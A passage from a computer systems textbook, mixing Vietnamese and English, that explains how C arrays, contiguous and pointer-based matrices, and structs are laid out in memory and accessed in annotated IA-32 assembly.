<p>Hãy nhớ rằng <a href="C8-IA32/../C1-C_intro/arrays_strings.html#_introduction_to_arrays">mảng</a> là tập hợp có thứ tự của các phần tử dữ liệu cùng kiểu, được lưu trữ liên tiếp trong bộ nhớ.<br />
Mảng một chiều được cấp phát tĩnh (<a href="C8-IA32/../C2-C_depth/arrays.html#_single_dimensional_arrays">single-dimension arrays</a>) có dạng <code>Type arr[N]</code>, trong đó:</p>
<ul>
<li><code>Type</code> là kiểu dữ liệu,</li>
<li><code>arr</code> là tên định danh của mảng,</li>
<li><code>N</code> là số phần tử dữ liệu.</li>
</ul>
<p>Khai báo mảng tĩnh như <code>Type arr[N]</code> hoặc cấp phát động như <code>arr = malloc(N*sizeof(Type))</code> sẽ cấp phát tổng cộng <em>N</em> × sizeof(<em>Type</em>) byte bộ nhớ, với <code>arr</code> trỏ tới vùng nhớ đó.</p>
<p>Để truy cập phần tử tại chỉ số <em>i</em> trong mảng <code>arr</code>, sử dụng cú pháp <code>arr[i]</code>.<br />
Compiler thường chuyển đổi các truy cập mảng thành <a href="C8-IA32/../C2-C_depth/pointers.html#_pointer_variables">pointer arithmetic</a> trước khi dịch sang assembly.<br />
Do đó:</p>
<ul>
<li><code>arr + i</code> tương đương với <code>&amp;arr[i]</code></li>
<li><code>*(arr + i)</code> tương đương với <code>arr[i]</code></li>
</ul>
<p>Vì mỗi phần tử trong <code>arr</code> có kiểu <code>Type</code>, nên <code>arr + i</code> ngụ ý rằng phần tử <em>i</em> được lưu tại địa chỉ <code>arr + sizeof(Type) * i</code>.</p>
<p><strong>Bảng 1</strong> liệt kê một số thao tác mảng phổ biến và lệnh assembly tương ứng.<br />
Giả sử:</p>
<ul>
<li>Thanh ghi <code>%edx</code> lưu địa chỉ của <code>arr</code></li>
<li>Thanh ghi <code>%ecx</code> lưu giá trị <code>i</code></li>
<li>Thanh ghi <code>%eax</code> biểu diễn một biến <code>x</code></li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>Operation</th><th>Type</th><th>Assembly Representation</th></tr></thead><tbody>
<tr><td><code>x = arr</code></td><td><code>int *</code></td><td><code>movl %edx, %eax</code></td></tr>
<tr><td><code>x = arr[0]</code></td><td><code>int</code></td><td><code>movl (%edx), %eax</code></td></tr>
<tr><td><code>x = arr[i]</code></td><td><code>int</code></td><td><code>movl (%edx, %ecx,4), %eax</code></td></tr>
<tr><td><code>x = &amp;arr[3]</code></td><td><code>int *</code></td><td><code>leal 0xc(%edx), %eax</code></td></tr>
<tr><td><code>x = arr+3</code></td><td><code>int *</code></td><td><code>leal 0xc(%edx), %eax</code></td></tr>
<tr><td><code>x = *(arr+3)</code></td><td><code>int</code></td><td><code>movl 0xc(%edx), %eax</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các thao tác mảng phổ biến và lệnh assembly tương ứng.</p>
<p>Hãy chú ý đến <strong>kiểu dữ liệu</strong> của từng biểu thức trong bảng trên.<br />
Thông thường, compiler dùng lệnh <code>movl</code> để dereference con trỏ và lệnh <code>leal</code> để tính toán địa chỉ.</p>
<p>Lưu ý: để truy cập phần tử <code>arr[3]</code> (hoặc <code>*(arr+3)</code> khi dùng pointer arithmetic), compiler sẽ tìm nạp dữ liệu tại địa chỉ <code>arr + 3*4</code> thay vì <code>arr + 3</code>.<br />
Nguyên nhân: bất kỳ phần tử nào tại chỉ số <em>i</em> trong mảng đều được lưu tại địa chỉ <code>arr + sizeof(Type) * i</code>.<br />
Do đó, compiler phải nhân chỉ số với kích thước kiểu dữ liệu để tính đúng offset.<br />
Hãy nhớ rằng bộ nhớ được đánh địa chỉ theo byte; việc dịch chuyển đúng số byte tương đương với việc tính toán địa chỉ chính xác.</p>
<p>Ví dụ: xét một mảng (<code>array</code>) gồm 5 phần tử kiểu <code>int</code> (<strong>Hình 1</strong>):</p>
<p><img src="C8-IA32/_images/arrayFig.png" alt="Each integer in the array requires four bytes." /><br />
<strong>Hình 1.</strong> Cách bố trí một mảng 5 số nguyên trong bộ nhớ. Mỗi ô được gắn nhãn x~i~ biểu diễn một byte, mỗi <code>int</code> chiếm 4 byte.</p>
<p>Vì <code>array</code> là mảng số nguyên, mỗi phần tử chiếm đúng 4 byte.<br />
Do đó, một mảng <code>int</code> gồm 5 phần tử sẽ tiêu tốn 20 byte bộ nhớ liên tiếp.</p>
<p>Để tính địa chỉ của phần tử thứ 3, compiler nhân chỉ số 3 với kích thước kiểu <code>int</code> (4) để được offset 12.<br />
Quả thật, phần tử thứ 3 trong <strong>Hình 1</strong> nằm tại byte offset x~12~.</p>
<p>Hãy xem một hàm C đơn giản <code>sumArray</code> tính tổng tất cả các phần tử trong mảng:</p>
<pre><code class="language-c">int sumArray(int *array, int length) {
    int i, total = 0;
    for (i = 0; i &lt; length; i++) {
        total += array[i];
    }
    return total;
}
</code></pre>
<p>Hàm <code>sumArray</code> nhận địa chỉ của một mảng và độ dài tương ứng, sau đó cộng dồn tất cả các phần tử trong mảng.<br />
Tiếp theo, chúng ta sẽ xem code assembly tương ứng của hàm <code>sumArray</code>.</p>
<pre><code>&lt;sumArray&gt;:
 &lt;+0&gt;:  push %ebp                    # lưu ebp
 &lt;+1&gt;:  mov  %esp,%ebp               # cập nhật ebp (stack frame mới)
 &lt;+3&gt;:  sub  $0x10,%esp              # thêm 16 byte vào stack frame
 &lt;+6&gt;:  movl $0x0,-0x8(%ebp)         # copy 0 vào %ebp-8 (total)
 &lt;+13&gt;: movl $0x0,-0x4(%ebp)         # copy 0 vào %ebp-4 (i)
 &lt;+20&gt;: jmp  0x80484ab &lt;sumArray+46&gt; # goto &lt;sumArray+46&gt; (start)
 &lt;+22&gt;: mov  -0x4(%ebp),%eax         # copy i vào %eax
 &lt;+25&gt;: lea  0x0(,%eax,4),%edx       # copy i*4 vào %edx
 &lt;+32&gt;: mov  0x8(%ebp),%eax          # copy array vào %eax
 &lt;+35&gt;: add  %edx,%eax               # copy array+i*4 vào %eax
 &lt;+37&gt;: mov  (%eax),%eax             # copy *(array+i*4) vào %eax
 &lt;+39&gt;: add  %eax,-0x8(%ebp)         # cộng *(array+i*4) vào total
 &lt;+42&gt;: addl $0x1,-0x4(%ebp)         # cộng 1 vào i
 &lt;+46&gt;: mov  -0x4(%ebp),%eax         # copy i vào %eax
 &lt;+49&gt;: cmp  0xc(%ebp),%eax          # so sánh i với length
 &lt;+52&gt;: jl   0x8048493 &lt;sumArray+22&gt; # nếu i&lt;length goto &lt;sumArray+22&gt; (loop)
 &lt;+54&gt;: mov  -0x8(%ebp),%eax         # copy total vào %eax
 &lt;+57&gt;: leave                        # chuẩn bị thoát hàm
 &lt;+58&gt;: ret                          # trả về total
</code></pre>
<p>Khi lần theo đoạn code assembly này, hãy xem xét liệu dữ liệu được truy cập là một <strong>địa chỉ</strong> hay một <strong>giá trị</strong>.<br />
Ví dụ: lệnh tại <code>&lt;sumArray+13&gt;</code> khiến <code>%ebp-4</code> chứa một biến kiểu <code>int</code>, ban đầu được gán giá trị 0.<br />
Ngược lại, đối số được lưu tại <code>%ebp+8</code> là tham số đầu tiên của hàm (<code>array</code>), có kiểu <code>int *</code> và tương ứng với địa chỉ cơ sở của mảng.<br />
Một biến khác (chúng ta gọi là <code>total</code>) được lưu tại <code>%ebp-8</code>.</p>
<p>Hãy xem kỹ hơn 5 lệnh từ <code>&lt;sumArray+22&gt;</code> đến <code>&lt;sumArray+39&gt;</code>:</p>
<pre><code>&lt;+22&gt;: mov  -0x4(%ebp),%eax      # copy i vào %eax
&lt;+25&gt;: lea  0x0(,%eax,4),%edx    # copy i*4 vào %edx
&lt;+32&gt;: mov  0x8(%ebp),%eax       # copy array vào %eax
&lt;+35&gt;: add  %edx,%eax            # copy array+i*4 vào %eax
&lt;+37&gt;: mov  (%eax),%eax          # copy *(array+i*4) vào %eax
&lt;+39&gt;: add  %eax,-0x8(%ebp)      # cộng *(array+i*4) vào total (total += array[i])
</code></pre>
<p>Hãy nhớ rằng compiler thường dùng <code>lea</code> để thực hiện các phép toán số học đơn giản trên toán hạng.<br />
Toán hạng <code>0x0(,%eax,4)</code> tương đương với <code>%eax*4 + 0x0</code>.<br />
Vì <code>%eax</code> đang giữ giá trị <code>i</code>, phép toán này sẽ copy giá trị <code>i*4</code> vào <code>%edx</code>.<br />
Tại thời điểm này, <code>%edx</code> chứa số byte cần cộng thêm để tính đúng offset của <code>array[i]</code>.</p>
<p>Lệnh tiếp theo (<code>mov 0x8(%ebp), %eax</code>) copy tham số đầu tiên (địa chỉ cơ sở của <code>array</code>) vào <code>%eax</code>.<br />
Cộng <code>%edx</code> vào <code>%eax</code> ở lệnh kế tiếp khiến <code>%eax</code> chứa <code>array + i*4</code>.<br />
Hãy nhớ rằng phần tử tại chỉ số <em>i</em> trong <code>array</code> được lưu tại địa chỉ <code>array + sizeof(T) * i</code>.<br />
Do đó, <code>%eax</code> lúc này chứa kết quả tính toán ở cấp độ assembly của địa chỉ <code>&amp;array[i]</code>.</p>
<p>Lệnh tại <code>&lt;sumArray+37&gt;</code> <em>dereference</em> giá trị tại <code>%eax</code>, đưa giá trị <code>array[i]</code> vào <code>%eax</code>.<br />
Cuối cùng, <code>%eax</code> được cộng vào giá trị tại <code>%ebp-8</code> (tức <code>total</code>).<br />
Vì vậy, 5 lệnh từ <code>&lt;sumArray+22&gt;</code> đến <code>&lt;sumArray+39&gt;</code> tương ứng với dòng <code>total += array[i]</code> trong hàm <code>sumArray</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="88-matrices"><a class="header" href="#88-matrices">8.8. Matrices</a></h2>
<p>A matrix is a two-dimensional (2D) array. A matrix in the C language can
be statically allocated as a 2D array (<code>M[n][m]</code>), dynamically allocated
with a single call to <code>malloc</code>, or dynamically allocated as an array of
arrays. Let's consider the array of arrays implementation. The first
array contains <code>n</code> elements (<code>M[n]</code>), and each element <code>M[i]</code> in our
matrix contains an array of <code>m</code> elements. The following code snippets
each declare matrices of size 4 × 3:</p>
<pre><code>//statically allocated matrix (allocated on stack)
int M1[4][3];

//dynamically allocated matrix (programmer friendly, allocated on heap)
int **M2, i;
M2 = malloc(4 * sizeof(int*));
for (i = 0; i &lt; 4; i++) {
    M2[i] = malloc(3 * sizeof(int));
}
</code></pre>
<p>In the case of the dynamically allocated matrix, the main array contains
a contiguous array of <code>int</code> pointers. Each integer pointer points to a
different array in memory. Figure 1 illustrates how we
would normally visualize each of these matrices.</p>
<p><img src="C8-IA32/_images/matrices.png" alt="matrices" /></p>
<p>Figure 1. Illustration of a statically allocated (M1) and a dynamically
allocated (M2) 3x4 matrix</p>
<p>For both of these matrix declarations, element (<em>i</em>,<em>j</em>) can be accessed
using the double-indexing syntax <code>M[i][j]</code>, where <code>M</code> is either <code>M1</code> or
<code>M2</code>. However, these matrices are organized differently in memory. Even
though both store the elements in their primary array contiguously in
memory, our statically allocated matrix also stores all the rows
contiguously in memory, as shown in Figure 2.</p>
<p><img src="C8-IA32/_images/matrixArray.png" alt="matrixArray" /></p>
<p>Figure 2. Matrix M1's memory layout in row-major order</p>
<p>This contiguous ordering is not guaranteed for <code>M2</code>. <a href="C8-IA32/../C2-C_depth/arrays.html#_two_dimensional_array_memory_layout">Recall
that</a>
to contiguously allocate an <em>n</em> × <em>m</em> matrix on the heap, we should use
a single call to <code>malloc</code> that allocates <em>n</em> × <em>m</em> elements:</p>
<pre><code>//dynamic matrix (allocated on heap, memory efficient way)
#define ROWS 4
#define COLS 3
int *M3;
M3  = malloc(ROWS * COLS * sizeof(int));
</code></pre>
<p>Recall that with the declaration of <code>M3</code>, element (<em>i</em>,<em>j</em>) <em>cannot</em> be
accessed using the <code>M[i][j]</code> notation. Instead, we must index the
element using the format <code>M3[i*cols + j]</code>.</p>
<h3 id="881-contiguous-two-dimensional-arrays"><a class="header" href="#881-contiguous-two-dimensional-arrays">8.8.1. Contiguous Two-Dimensional Arrays</a></h3>
<p>Consider a function <code>sumMat</code> that takes a pointer to a contiguously
allocated (either statically allocated or memory-efficiently dynamically
allocated) matrix as its first parameter, along with the numbers of rows
and columns, and returns the sum of all the elements inside the matrix.</p>
<p>We use scaled indexing in the code snippet that follows because it
applies to both statically and dynamically allocated contiguous
matrices. Recall that the syntax <code>m[i][j]</code> does not work with the
memory-efficient contiguous dynamic allocation previously discussed.</p>
<pre><code>int sumMat(int *m, int rows, int cols) {
    int i, j, total = 0;
    for (i = 0; i &lt; rows; i++){
        for (j = 0; j &lt; cols; j++){
            total += m[i*cols + j];
        }
    }
    return total;
}
</code></pre>
<p>Here is the corresponding assembly. Each line is annotated with its
English translation:</p>
<pre><code>&lt;sumMat&gt;:
0x08048507 &lt;+0&gt;:  push %ebp                  #save ebp
0x08048508 &lt;+1&gt;:  mov  %esp,%ebp             #update ebp (new stack frame)
0x0804850a &lt;+3&gt;:  sub  $0x10,%esp            #add 4 more spaces to stack frame
0x0804850d &lt;+6&gt;:  movl $0x0,-0xc(%ebp)       #copy 0 to ebp-12 (total)
0x08048514 &lt;+13&gt;: movl $0x0,-0x4(%ebp)       #copy 0 to ebp-4 (i)
0x0804851b &lt;+20&gt;: jmp  0x8048555 &lt;sumMat+78&gt; #goto &lt;sumMat+78&gt;
0x0804851d &lt;+22&gt;: movl $0x0,-0x8(%ebp)       #copy 0 to ebp-8 (j)
0x08048524 &lt;+29&gt;: jmp  0x8048549 &lt;sumMat+66&gt; #goto &lt;sumMat+66&gt;
0x08048526 &lt;+31&gt;: mov  -0x4(%ebp),%eax       #copy i to eax
0x08048529 &lt;+34&gt;: imul 0x10(%ebp),%eax       #multiply i * cols, place in eax
0x0804852d &lt;+38&gt;: mov  %eax,%edx             #copy i*cols to edx
0x0804852f &lt;+40&gt;: mov  -0x8(%ebp),%eax       #copy j to %eax
0x08048532 &lt;+43&gt;: add  %edx,%eax             #add i*cols with j, place in eax
0x08048534 &lt;+45&gt;: lea  0x0(,%eax,4),%edx     #mult (i*cols+j) by 4,put in edx
0x0804853b &lt;+52&gt;: mov  0x8(%ebp),%eax        #copy m pointer to eax
0x0804853e &lt;+55&gt;: add  %edx,%eax             #add m to (i*cols+j)*4,put in eax
0x08048540 &lt;+57&gt;: mov  (%eax),%eax           #copy m[i*cols+j] to eax
0x08048542 &lt;+59&gt;: add  %eax,-0xc(%ebp)       #add eax to total
0x08048545 &lt;+62&gt;: addl $0x1,-0x8(%ebp)       #increment j by 1 (j+=1)
0x08048549 &lt;+66&gt;: mov  -0x8(%ebp),%eax       #copy j to eax
0x0804854c &lt;+69&gt;: cmp  0x10(%ebp),%eax       #compare j with cols
0x0804854f &lt;+72&gt;: jl   0x8048526 &lt;sumMat+31&gt; #if (j &lt; cols) goto &lt;sumMat+31&gt;
0x08048551 &lt;+74&gt;: addl $0x1,-0x4(%ebp)       #add 1 to i (i+=1)
0x08048555 &lt;+78&gt;: mov  -0x4(%ebp),%eax       #copy i to eax
0x08048558 &lt;+81&gt;: cmp  0xc(%ebp),%eax        #compare i with rows
0x0804855b &lt;+84&gt;: jl   0x804851d &lt;sumMat+22&gt; #if (i &lt; rows) goto sumMat+22
0x0804855d &lt;+86&gt;: mov  -0xc(%ebp),%eax       #copy total to eax
0x08048560 &lt;+89&gt;: leave                      #prepare to leave the function
0x08048561 &lt;+90&gt;: ret                        #return total
</code></pre>
<p>The local variables <code>i</code>, <code>j</code>, and <code>total</code> are loaded at addresses
<code>%ebp-4</code>, <code>%ebp-8</code>, and <code>%ebp-12</code> on the stack, respectively. The input
parameters <code>m</code>, <code>row</code>, and <code>cols</code> are located at locations <code>%ebp+8</code>,
<code>%ebp+12</code>, and <code>%ebp+16</code>, respectively. Using this knowledge, let's zoom
in on the component that just deals with the access of element (<em>i</em>,<em>j</em>)
in our matrix:</p>
<pre><code>0x08048526 &lt;+31&gt;: mov  -0x4(%ebp),%eax    # copy i to eax
0x08048529 &lt;+34&gt;: imul 0x10(%ebp),%eax    # multiply i with cols, place in eax
0x0804852d &lt;+38&gt;: mov  %eax,%edx          # copy i*cols to edx
</code></pre>
<p>The first set of instructions computes <code>i * cols</code> and places the result
in register <code>%edx</code>. Recall that for a matrix named <code>matrix</code>,
<code>matrix + (i * cols)</code> is equivalent to <code>&amp;matrix[i]</code>.</p>
<hr />
<pre><code>0x0804852f &lt;+40&gt;: mov -0x8(%ebp),%eax   # copy j to eax
0x08048532 &lt;+43&gt;: add %edx,%eax         # add i*cols with j, place in eax
0x08048534 &lt;+45&gt;: lea 0x0(,%eax,4),%edx # multiply (i*cols+j) by 4, put in edx
</code></pre>
<p>The next set of instructions computes <code>(i * cols + j) * 4</code>. The compiler
multiplies the index <code>(i * cols) + j</code> by four because each element in
the matrix is a four-byte integer, and this multiplication enables the
compiler to calculate the correct offset.</p>
<hr />
<p>The last set of instructions adds the calculated offset to the matrix
pointer and dereferences it to yield the value of element (<em>i</em>,<em>j</em>):</p>
<pre><code>0x0804853b &lt;+52&gt;: mov 0x8(%ebp),%eax    # copy m pointer to eax
0x0804853e &lt;+55&gt;: add %edx,%eax         # add m to (i*cols+j)*4, place in eax
0x08048540 &lt;+57&gt;: mov (%eax),%eax       # copy m[i*cols+j] to eax
0x08048542 &lt;+59&gt;: add %eax,-0xc(%ebp)   # add eax to total
</code></pre>
<p>The first instruction loads the address of matrix <code>m</code> into register
<code>%eax</code>. The <code>add</code> instruction adds the offset <code>(i*cols + j)*4</code> to the
address of <code>m</code> to correctly calculate the address of element (<em>i</em>,<em>j</em>),
and then places this address in register <code>%eax</code>. The third instruction
dereferences <code>%eax</code> and places the resulting value in register <code>%eax</code>.
The last instruction adds the value in <code>%eax</code> to the accumulator
<code>total</code>, which is located at stack address <code>%ebp-0xc</code>.</p>
<p>Let's consider how element (1,2) is accessed in <a href="C8-IA32/matrices.html#Matrices732">Figure
2</a>.</p>
<p><img src="C8-IA32/_images/matrixArray.png" alt="matrixArray" /></p>
<p>Figure 3. Matrix M1's memory layout in row-major order</p>
<p>Element (1,2) is located at address <code>M1 + (1 * COLS) + 2</code>. Since <code>COLS</code>
= 3, element (1,2) corresponds to <code>M1+5</code>. To access the element at this
location, the compiler must multiply <code>5</code> by the size of the <code>int</code> data
type (four bytes), yielding the offset <code>M1 + 20</code>, which corresponds to
byte x~20~ in the figure. Dereferencing this location yields element 5,
which is indeed element (1,2) in the matrix.</p>
<h3 id="882-noncontiguous-matrix"><a class="header" href="#882-noncontiguous-matrix">8.8.2. Noncontiguous Matrix</a></h3>
<p>The noncontiguous matrix implementation is a bit more complicated.
Figure 4 visualizes how <code>M2</code> may be laid out in
memory.</p>
<p><img src="C8-IA32/_images/dynamicMatrixLayout.png" alt="matrixDynamic" /></p>
<p>Figure 4. Matrix M2's noncontiguous layout in memory</p>
<p>Notice that the array of pointers is contiguous, and that each array
pointed to by an element of <code>M2</code> (e.g., <code>M2[i]</code>) is contiguous. However,
the individual arrays are not contiguous with one another.</p>
<p>The <code>sumMatrix</code> function in the following example takes an array of
integer pointers (called <code>matrix</code>) as its first parameter, and a number
of rows and columns as its second and third parameters:</p>
<pre><code>int sumMatrix(int **matrix, int rows, int cols) {

    int i, j, total=0;

    for (i = 0; i &lt; rows; i++) {
        for (j = 0; j &lt; cols; j++) {
            total += matrix[i][j];
        }
    }
    return total;
}
</code></pre>
<p>Even though this function looks nearly identical to the <code>sumMat</code>
function shown earlier, the matrix accepted by this function consists of
a contiguous array of <em>pointers</em>. Each pointer contains the address of a
separate contiguous array, which corresponds to a separate row in the
matrix.</p>
<p>The corresponding assembly for <code>sumMatrix</code> follows. Each line is
annotated with its English translation.</p>
<pre><code>0x080484ad &lt;+0&gt;:  push %ebp                     # save ebp
0x080484ae &lt;+1&gt;:  mov  %esp,%ebp                # update ebp (new stack frame)
0x080484b0 &lt;+3&gt;:  sub  $0x10,%esp               # add 4 spaces to stack frame
0x080484b3 &lt;+6&gt;:  movl $0x0,-0xc(%ebp)          # copy 0 to %ebp-12 (total)
0x080484ba &lt;+13&gt;: movl $0x0,-0x4(%ebp)          # copy 0 to %ebp-4 (i)
0x080484c1 &lt;+20&gt;: jmp  0x80484fa &lt;sumMatrix+77&gt; # goto &lt;sumMatrix+77&gt;
0x080484c3 &lt;+22&gt;: movl $0x0,-0x8(%ebp)          # copy 0 to %ebp-8 (j)
0x080484ca &lt;+29&gt;: jmp  0x80484ee &lt;sumMatrix+65&gt; # goto &lt;sumMatrix+65&gt;
0x080484cc &lt;+31&gt;: mov  -0x4(%ebp),%eax          # copy i to %eax
0x080484cf &lt;+34&gt;: lea  0x0(,%eax,4),%edx        # mult i by 4, place in %edx
0x080484d6 &lt;+41&gt;: mov  0x8(%ebp),%eax           # copy matrix to %eax
0x080484d9 &lt;+44&gt;: add  %edx,%eax                # put (i * 4) + matrix in %eax
0x080484db &lt;+46&gt;: mov  (%eax),%eax              # copy matrix[i] to %eax
0x080484dd &lt;+48&gt;: mov  -0x8(%ebp),%edx          # copy j to %edx
0x080484e0 &lt;+51&gt;: shl  $0x2,%edx                # mult j by 4, place in %edx
0x080484e3 &lt;+54&gt;: add  %edx,%eax                # put (j*4)+matrix[i] in %eax
0x080484e5 &lt;+56&gt;: mov  (%eax),%eax              # copy matrix[i][j] to %eax
0x080484e7 &lt;+58&gt;: add  %eax,-0xc(%ebp)          # add matrix[i][j] to total
0x080484ea &lt;+61&gt;: addl $0x1,-0x8(%ebp)          # add 1 to j (j+=1)
0x080484ee &lt;+65&gt;: mov  -0x8(%ebp),%eax          # copy j to %eax
0x080484f1 &lt;+68&gt;: cmp  0x10(%ebp),%eax          # compare j with cols
0x080484f4 &lt;+71&gt;: jl   0x80484cc &lt;sumMatrix+31&gt; # if j&lt;cols goto&lt;sumMatrix+31&gt;
0x080484f6 &lt;+73&gt;: addl $0x1,-0x4(%ebp)          # add 1 to i (i+=1)
0x080484fa &lt;+77&gt;: mov  -0x4(%ebp),%eax          # copy i to %eax
0x080484fd &lt;+80&gt;: cmp  0xc(%ebp),%eax           # compare i with rows
0x08048500 &lt;+83&gt;: jl   0x80484c3 &lt;sumMatrix+22&gt; # if i&lt;rows goto&lt;sumMatrix+22&gt;
0x08048502 &lt;+85&gt;: mov  -0xc(%ebp),%eax          # copy total to %eax
0x08048505 &lt;+88&gt;: leave                         # prepare to leave function
0x08048506 &lt;+89&gt;: ret                           # return total
</code></pre>
<p>Again, the variables <code>i</code>, <code>j</code>, and <code>total</code> are at stack addresses
<code>%ebp-4</code>, <code>%ebp-8</code>, and <code>%ebp-12</code>, respectively. The input parameters
<code>m</code>, <code>row</code>, and <code>cols</code> are located at stack addresses <code>%ebp+8</code>,
<code>%ebp+12</code>, and <code>%ebp+16</code>, respectively.</p>
<p>Let's zoom in on the section that deals specifically with an access to
element (<em>i</em>,<em>j</em>), or <code>matrix[i][j]</code>:</p>
<pre><code>0x080484cc &lt;+31&gt;: mov -0x4(%ebp),%eax      # copy i to %eax
0x080484cf &lt;+34&gt;: lea 0x0(,%eax,4),%edx    # multiply i by 4, place in %edx
0x080484d6 &lt;+41&gt;: mov 0x8(%ebp),%eax       # copy matrix to %eax
0x080484d9 &lt;+44&gt;: add %edx,%eax            # add i*4 to matrix, place in %eax
0x080484db &lt;+46&gt;: mov (%eax),%eax          # copy matrix[i] to %eax
</code></pre>
<p>The five instructions between <code>&lt;sumMatrix+31&gt;</code> and <code>&lt;sumMatrix+46&gt;</code>
compute <code>matrix[i]</code>, or <code>*(matrix+i)</code>. Note that the compiler needs to
multiply <code>i</code> by four prior to adding it to <code>matrix</code> to calculate the
correct offset (recall that pointers are four bytes in size). The
instruction at <code>&lt;sumMatrix+46&gt;</code> then dereferences the calculated address
to get the element <code>matrix[i]</code>.</p>
<p>Since <code>matrix</code> is an array of <code>int</code> pointers, the element located at
<code>matrix[i]</code> is itself an <code>int</code> pointer. The <em>j</em>^th^ element in
<code>matrix[i]</code> is located at offset <code>j×4</code> in the <code>matrix[i]</code> array.</p>
<hr />
<p>The next set of instructions extract the <em>j</em>^th^ element in array
<code>matrix[i]</code>:</p>
<pre><code>0x080484dd &lt;+48&gt;: mov -0x8(%ebp),%edx    # copy j to %edx
0x080484e0 &lt;+51&gt;: shl $0x2,%edx          # multiply j by 4, place in %edx
0x080484e3 &lt;+54&gt;: add %edx,%eax          # add j*4 to matrix[i], place in %eax
0x080484e5 &lt;+56&gt;: mov (%eax),%eax        # copy matrix[i][j] to %eax
0x080484e7 &lt;+58&gt;: add %eax,-0xc(%ebp)    # add matrix[i][j] to total
</code></pre>
<p>The first instruction in this snippet loads variable <code>j</code> into register
<code>%edx</code>. The compiler uses the left shift (<code>shl</code>) instruction to multiply
<code>j</code> by four and stores the result in register <code>%edx</code>. The compiler then
adds the resulting value to the address located in <code>matrix[i]</code> to get
the address of <code>matrix[i][j]</code>.</p>
<p>Let's revisit Figure 4 and consider an example
access to <code>M2[1][2]</code>. For convenience, we reproduce the figure in
Figure 5.</p>
<p><img src="C8-IA32/_images/dynamicMatrixLayout.png" alt="matrixDynamic" /></p>
<p>Figure 5. Matrix M2's noncontiguous layout in memory</p>
<p>Note that <code>M2</code> starts at memory location x~0~. The compiler first
computes the address of <code>M2[1]</code> by multiplying 1 by 4 (<code>sizeof(int *)</code>)
and adding it to the address of <code>M2</code> (x~0~), yielding the new address
x~4~. A dereference of this address yields the address associated with
<code>M2[1]</code>, or x~36~. The compiler then multiplies index 2 by 4
(<code>sizeof(int)</code>), and adds the result (8) to x~36~, yielding a final
address of x~44~. The address x~44~ is dereferenced, yielding the value
5. Sure enough, the element in Figure 5 that
corresponds to <code>M2[1][2]</code> has the value 5.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="89-struct-trong-assembly"><a class="header" href="#89-struct-trong-assembly">8.9. struct trong Assembly</a></h2>
<p>Một <strong>struct</strong> là một cách khác để tạo ra một tập hợp các kiểu dữ liệu trong C. Khác với <strong>array</strong> (mảng), <strong>struct</strong> cho phép nhóm các kiểu dữ liệu khác nhau lại với nhau. Ngôn ngữ C lưu trữ một <code>struct</code> giống như một <strong>single-dimension array</strong> (mảng một chiều), trong đó các phần tử dữ liệu (<em>field</em>) được lưu trữ liên tiếp nhau trong bộ nhớ.</p>
<p>Hãy cùng xem lại <code>struct studentT</code> từ Chương 1:</p>
<pre><code class="language-c">struct studentT {
    char name[64];
    int  age;
    int  grad_yr;
    float gpa;
};

struct studentT student;
</code></pre>
<p>Hình 1 minh họa cách <code>student</code> được bố trí trong bộ nhớ.<br />
Để đơn giản, giả sử <code>student</code> bắt đầu tại địa chỉ x~0~. Mỗi x~i~ biểu thị địa chỉ của một <em>field</em>.</p>
<p><img src="C8-IA32/_images/structArray.png" alt="structArray" /></p>
<p><strong>Hình 1.</strong> Sơ đồ bố trí bộ nhớ của struct <code>student</code></p>
<p>Các <em>field</em> được lưu trữ liên tiếp nhau trong bộ nhớ theo đúng thứ tự mà chúng được khai báo. Trong Hình 1, <em>field</em> <code>age</code> được cấp phát ngay sau <em>field</em> <code>name</code> (tại byte offset x~64~), tiếp theo là <code>grad_yr</code> (byte offset x~68~) và <code>gpa</code> (byte offset x~72~). Cách tổ chức này cho phép truy cập các <em>field</em> một cách hiệu quả về mặt bộ nhớ.</p>
<p>Để hiểu cách <strong>compiler</strong> (trình biên dịch) sinh code Assembly để làm việc với một <code>struct</code>, hãy xem xét hàm <code>initStudent</code>:</p>
<pre><code class="language-c">void initStudent(struct studentT *s, char *nm, int ag, int gr, float g) {
    strncpy(s-&gt;name, nm, 64);
    s-&gt;grad_yr = gr;
    s-&gt;age = ag;
    s-&gt;gpa = g;
}
</code></pre>
<p>Hàm <code>initStudent</code> sử dụng địa chỉ cơ sở của một <code>struct studentT</code> làm tham số đầu tiên, và các giá trị mong muốn cho từng <em>field</em> làm các tham số còn lại. Danh sách dưới đây mô tả hàm này ở dạng Assembly.<br />
Nói chung, tham số thứ <em>i</em> của hàm <code>initStudent</code> nằm tại địa chỉ stack <code>(ebp+8)</code> + 4 × <em>i</em>.</p>
<pre><code>&lt;initStudent&gt;:
 &lt;+0&gt;:   push  %ebp                     # lưu ebp
 &lt;+1&gt;:   mov   %esp,%ebp                # cập nhật ebp (tạo stack frame mới)
 &lt;+3&gt;:   sub   $0x18,%esp               # cấp thêm 24 byte cho stack frame
 &lt;+6&gt;:   mov   0x8(%ebp),%eax           # copy tham số 1 (s) vào eax
 &lt;+9&gt;:   mov   0xc(%ebp),%edx           # copy tham số 2 (nm) vào edx
 &lt;+12&gt;:  mov   $0x40,0x8(%esp)          # copy 0x40 (64) vào esp+8
 &lt;+16&gt;:  mov   %edx,0x4(%esp)           # copy nm vào esp+4
 &lt;+20&gt;:  mov   %eax,(%esp)              # copy s lên đỉnh stack (esp)
 &lt;+23&gt;:  call  0x8048320 &lt;strncpy@plt&gt;  # gọi strncpy(s-&gt;name, nm, 64)
 &lt;+28&gt;:  mov   0x8(%ebp),%eax           # copy s vào eax
 &lt;+32&gt;:  mov   0x14(%ebp),%edx          # copy tham số 4 (gr) vào edx
 &lt;+35&gt;:  mov   %edx,0x44(%eax)          # copy gr vào offset eax+68 (s-&gt;grad_yr)
 &lt;+38&gt;:  mov   0x8(%ebp),%eax           # copy s vào eax
 &lt;+41&gt;:  mov   0x10(%ebp),%edx          # copy tham số 3 (ag) vào edx
 &lt;+44&gt;:  mov   %edx,0x40(%eax)          # copy ag vào offset eax+64 (s-&gt;age)
 &lt;+47&gt;:  mov   0x8(%ebp),%edx           # copy s vào edx
 &lt;+50&gt;:  mov   0x18(%ebp),%eax          # copy g vào eax
 &lt;+53&gt;:  mov   %eax,0x48(%edx)          # copy g vào offset edx+72 (s-&gt;gpa)
 &lt;+56&gt;:  leave                          # chuẩn bị thoát hàm
 &lt;+57&gt;:  ret                            # trả về
</code></pre>
